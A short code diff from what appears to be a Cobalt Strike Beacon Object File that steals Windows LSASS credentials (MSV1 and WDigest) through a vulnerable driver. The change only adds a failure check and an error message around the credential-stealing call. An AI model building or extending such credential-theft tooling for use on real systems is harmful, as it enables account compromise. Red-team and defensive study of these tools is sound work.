@@ -159,7 +159,10 @@ int go(char *args, int argLen)
     }
 
 
-    StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials);
+    if (!StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
+    }
 
 
     BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
